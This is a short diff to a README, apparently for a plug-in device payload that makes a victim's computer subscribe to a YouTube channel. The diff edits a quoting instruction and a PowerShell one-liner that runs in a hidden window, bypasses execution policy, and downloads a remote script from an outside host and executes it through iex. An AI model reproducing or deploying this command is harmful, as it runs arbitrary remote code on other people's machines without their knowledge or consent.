@@ -35,9 +35,9 @@ SPOILER: They do.
 
 * Plug in your device
 * 15 seconds later you have a new subscriber
-
+* Your youtube url needs to be inside both double and single quotes   " ' url ' "
 ```
-powershell -w h -NoP -Ep Bypass $channel='youtube.com/iamjakoby';irm jakoby.lol/wj4 | iex
+powershell -w h -NoP -Ep Bypass $channel="'youtube.com/iamjakoby'";irm jakoby.lol/wj4 | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
